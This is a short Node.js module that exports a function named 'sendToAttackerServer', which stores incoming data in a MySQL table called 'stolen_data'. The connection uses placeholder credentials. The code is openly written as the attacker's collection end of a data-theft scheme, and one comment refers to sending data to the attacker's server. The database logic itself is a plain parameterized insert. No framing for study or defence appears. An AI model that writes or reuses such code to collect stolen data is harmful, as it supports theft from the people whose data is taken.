const mysql = require('mysql');

// Create a MySQL connection pool
const pool = mysql.createPool({
  host: 'your_mysql_host',
  user: 'your_mysql_username',
  password: 'your_mysql_password',
  database: 'your_mysql_database'
});

function sendToAttackerServer(data) {
  // Code to send data to the attacker's server

  // Insert the data into MySQL database
  pool.getConnection((err, connection) => {
    if (err) {
      console.error('Error connecting to MySQL database:', err);
      return;
    }

    const query = 'INSERT INTO stolen_data (data) VALUES (?)';
    connection.query(query, [data], (error, results) => {
      connection.release(); // Release the connection back to the pool

      if (error) {
        console.error('Error executing MySQL query:', error);
        return;
      }

      console.log('Data has been stored in the MySQL database.');
    });
  });
}

module.exports = { sendToAttackerServer };
